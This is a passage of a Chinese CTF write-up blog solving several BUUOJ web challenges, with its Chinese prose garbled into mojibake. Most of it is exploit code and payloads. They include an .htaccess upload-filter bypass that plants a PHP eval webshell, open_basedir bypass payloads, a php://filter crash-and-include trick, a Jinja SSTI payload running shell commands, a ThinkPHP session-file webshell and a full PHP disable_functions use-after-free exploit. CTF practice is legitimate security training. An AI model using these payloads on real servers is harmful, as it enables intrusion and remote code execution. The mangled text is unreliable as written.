class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹ä¸€æ­¥å°±æ˜¯èµ°æ–‡ä»¶å†…å®¹è¿‡æ»¤ç»•è¿‡äº†</p><p>é¦–å…ˆè¿‡äº†æ–‡ä»¶å¸¦phåç¼€ï¼Œç„¶åæ£€æŸ¥æ–‡ä»¶ä¸­æœ‰æ²¡æœ‰&lt;?ï¼Œæœ€åé€šè¿‡<code>exif_imagetype</code>çœ‹çœ‹æ˜¯ä¸æ˜¯å›¾ç‰‡</p><p>æ‰€æœ‰phpç±»å‹æ–‡ä»¶æƒ³éƒ½ä¸è¦æƒ³äº†ï¼Œç”¨.htaccessï¼Œä½†æ˜¯å¦‚æœç›´æ¥æ·»åŠ å¹»æ•°å¤´ä¼šå¯¼è‡´æ•´ä¸ªæ–‡ä»¶ä¸è¢«è§£æï¼Œæ‰€ä»¥æ–°çŸ¥è¯†æ¥è¾£</p><blockquote><p>exif_imagetype()å‡½æ•°æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºç¡®å®šå›¾åƒçš„ç±»å‹ã€‚</p><p><strong>ç”¨æ³•:</strong></p><pre class="line-numbers language-none"><code class="language-none">int exif_imagetype( string $filename )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å‚æ•°ï¼š</strong>è¯¥å‡½æ•°æ¥å—å•ä¸ªå‚æ•°$filenameï¼Œè¯¥å‚æ•°ä¿å­˜å›¾åƒçš„åç§°æˆ–URLã€‚</p><p><strong>è¿”å›å€¼ï¼š</strong>æ­¤å‡½æ•°è¿”å›ä¸IMAGETYPEå¸¸é‡ä¹‹ä¸€ç›¸å¯¹åº”çš„æ•´æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>IMAGETYPE_GIF(1)</li><li>IMAGETYPE_JPEG(2)</li><li>IMAGETYPE_PNG(3)</li><li>IMAGETYPE_SWF(4)</li><li>IMAGETYPE_PSD(5)</li><li>IMAGETYPE_BMP(6)</li><li>IMAGETYPE_TIFF_II(7)</li><li>IMAGETYPE_TIFF_MM(8)</li><li>IMAGETYPE_JPC(9)</li><li>IMAGETYPE_JP2(10)</li><li>IMAGETYPE_JPX(11)</li><li>IMAGETYPE_JB2(12)</li><li>IMAGETYPE_SWC(13)</li><li>IMAGETYPE_IFF(14)</li><li>IMAGETYPE_WBMP(15)</li><li>IMAGETYPE_XBM(16)</li><li>IMAGETYPE_ICO(17)</li><li>IMAGETYPE_WEBP(18)</li></ul></blockquote><p>åªæœ‰å½“æ–‡ä»¶å†…å®¹ä¸å±äºä»¥ä¸Šä»»ä½•ä¸€ç§å›¾ç‰‡ç±»å‹çš„æ—¶å€™æ‰ä¼šè¿”å›FALSE</p><p>è€Œåœ¨.htaccessä¸­æœ‰ä¸¤ä¸ªæ³¨é‡Šç¬¦å·</p><pre class="line-numbers language-none"><code class="language-none">\x00#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ°å·§åœ¨å›¾ç‰‡ä¸­å°±æœ‰ä¸¤ç§ç±»å‹çš„å›¾ç‰‡æ˜¯æœ‰è¿™æ ·å¼€å¤´çš„å†…å®¹çš„</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-09">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-09</a> 23.51.41.png)</p><blockquote><p>\x00\x00\x85\x85 åªèƒ½æ”¾åœ¨æ–‡ä»¶å¼€å¤´ä½ç½®</p></blockquote><blockquote><p>#define width 1337<br>#define height 1337<br>å¯ä»¥æ”¾åœ¨æ–‡ä»¶ä»»æ„ä½ç½®</p></blockquote><p>æ³¨æ„å¥½è¿™ä¸ªå°±å¯ä»¥ä¸Šä¼ æˆåŠŸ.htaccessæ–‡ä»¶å•¦</p><p>ä¸‹é¢æƒ³æƒ³æœ¨é©¬å¦‚ä½•æ„é€ ï¼Œç”±äºå¯¹å†…å®¹ä¸­çš„æ ‡ç­¾&lt;?è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½ä½¿ç”¨ä»»ä½•å·²çŸ¥çš„çŸ­æ ‡ç­¾ç»•è¿‡æ–¹æ³•è¿›è¡Œç»•è¿‡çš„ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªç‰ˆæœ¬çš„PHPä¸­ï¼Œç±»ä¼¼äº<code>&lt;script language=&quot;php&quot;&gt;</code>è¿™æ ·çš„æ ‡ç­¾ä¹Ÿæ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œéªšæ“ä½œæ¥äº†ï¼Œä½¿ç”¨phpä¼ªåè®®ç”¨base64ç»•è¿‡ï¼Œæ„é€ å†…å®¹æ—¶åœ¨.htaccessä¸­æ·»åŠ ä¼ªåè®®ï¼Œæœ€ç»ˆæ„é€ å‡ºçš„shellå’Œ.htaccessæ–‡ä»¶å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">.htaccess#define width 1000#define height 1000AddType application&#x2F;x-httpd-php .kkkphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_cc551ab005b2e60fbdc88de809b2c4b1&#x2F;kk.kkk&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64hta<span class="token operator">=</span><span class="token triple-quoted-string string">b'''#define width 1000#define height 1000AddType application/x-httpd-php .kkkphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk"'''</span>hta<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>hta<span class="token punctuation">,</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>url<span class="token operator">=</span><span class="token string">"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag"</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>hta<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token string">b"GIF89aaa"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_REQUEST['kkk']);?>"</span><span class="token punctuation">)</span>she<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'kk.kkk'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>she<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ å¹¶è®¿é—®ï¼ŒæˆåŠŸ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-10">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-10</a> 00.09.32.png)</p><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å·¨å¤šçš„å‡½æ•°ï¼Œ<del>å…¶å®è¿™é‡Œæœç´¢flagå°±èƒ½ç›´æ¥æ‹¿åˆ°flagäº†</del>ï¼Œä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œopen_basediråˆè¢«é™åˆ¶äº†ï¼Œå°è¯•<a href="https://xz.aliyun.com/t/4720">ç»•è¿‡</a></p><pre class="line-numbers language-none"><code class="language-none">payload:kkk&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åæ‹¿flag</p><pre class="line-numbers language-none"><code class="language-none">payload:kkk&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>é¦–å…ˆçœ‹æºç æç¤ºï¼Œæç¤ºäº†passå†…å®¹ï¼Œå†çœ‹å“åº”å¤´ä¸­çš„Hashï¼Œç›´æ¥ä¼ å…¥ï¼Œè·³è½¬flflflflag.phpçœ‹å†…å®¹ä¸­æœ‰ä¸ªincludeï¼Œè¯»å–ä¸€æŠŠæºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†dataï¼Œinputï¼Œzip</p><p>æ–°çŸ¥è¯†</p><blockquote><p>å¯ä»¥åˆ©ç”¨</p><p>php://filter/string.strip_tags</p><p>å¯¼è‡´phpå´©æºƒï¼ŒåŒæ—¶å¯ä¸Šä¼ æ–‡ä»¶ä¿å­˜åœ¨/tmpç›®å½•æ¥ä¸Šä¼ æœ¨é©¬ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</li><li>php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</li><li>php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤</li><li>å¯ä»¥è·å–æ–‡ä»¶å</li><li>æºä»£ç å°†GETå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«</li></ul></blockquote><p>æ„é€ pythonè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span>phpfile <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo(); ?>"</span>filedata <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"file"</span><span class="token punctuation">:</span>phpfile<span class="token punctuation">&#125;</span>bak <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>filedata<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bak<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å®ä¾‹å´©æºƒé‡å¯ï¼Œä½†æ˜¯/tmpä¸­çš„å†…å®¹ä¾ç„¶ä¿å­˜ï¼Œè®¿é—®dir.phpï¼ˆç›®å½•æ‰«ææ‰«å‡ºæ¥çš„ï¼‰æŸ¥çœ‹tmpä¸­çš„å†…å®¹ï¼Œå‘ç°åˆšä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½¿ç”¨includeåŒ…å«åæœç´¢flagæ‹¿åˆ°flag</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p>è¿›å»è®¿é—®/secret</p><pre class="line-numbers language-none"><code class="language-none">Tell me your secret.I will encrypt it so others can&#39;t see<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¼ å‚æ•°secretï¼Œè¾“ç‚¹ä¹±ä¸ƒå…«ç³Ÿçš„è®©å®ƒæŠ¥é”™ï¼Œçœ‹æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment">#è§£å¯†</span>deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'flag detected!'</span><span class="token keyword">return</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°±æ˜¯å¯¹ä¼ å…¥çš„secretè¿›è¡ŒRC4ç¼–ç åå†æ¨¡ç‰ˆæ¸²æŸ“</p><p>å·ä¸€ä¸ªå¸ˆå‚…çš„è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("RC4åŠ å¯†ä¸»å‡½æ•°")</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print("åŸæ¥çš„ s ç›’ï¼š%s" % s_box)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># print("æ··ä¹±åçš„ s ç›’ï¼š%s"% s_box)</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚")</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s"</span> <span class="token operator">%</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rc4_main<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">,</span><span class="token string">"&#123;&#123;lipsum.__globals__.__builtins__.eval(\"__import__('os').popen('cat /flag.txt').read()\")&#125;&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥å–µå–µå–µ</p><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>çœ‹è¿™ä¸ªé¢˜ç›®æ€•ä¸æ˜¯ThinkPHPï¼Œéšä¾¿æä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œå‘ç°ç¡®å®æ˜¯ThinkPHP V6.0çš„ä¸€ä¸ªsessionå¤„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p><blockquote><p>å¤§æ¦‚å°±æ˜¯åœ¨./runtime/session/ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªåä¸ºsess_SESSIONIDçš„æ–‡ä»¶ï¼Œå†…å®¹æ˜¯ä¼ å…¥çš„å‚æ•°å†…å®¹</p></blockquote><p>é‚£ä¹ˆåœ¨æœç´¢å¤„æ„é€ æœ¨é©¬<code>&lt;?php eval($_POST[a]);?&gt;</code></p><p>ç„¶åè®¿é—®<code>/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php</code></p><p>banäº†ä¸€å †å‡½æ•°ï¼Œæ‰¾<code>disable_functions</code>ç»•è¿‡poc</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span><span class="token comment">#</span><span class="token comment"># Bug: https://bugs.php.net/bug.php?id=76047</span><span class="token comment"># debug_backtrace() returns a reference to a variable </span><span class="token comment"># that has been destroyed, causing a UAF vulnerability.</span><span class="token comment">#</span><span class="token comment"># This exploit should work on all PHP 7.0-7.4 versions</span><span class="token comment"># released as of 30/01/2020.</span><span class="token comment">#</span><span class="token comment"># Author: https://github.com/mm0r1</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">pwn</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># ;)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment"># PHP >= 7.4</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token 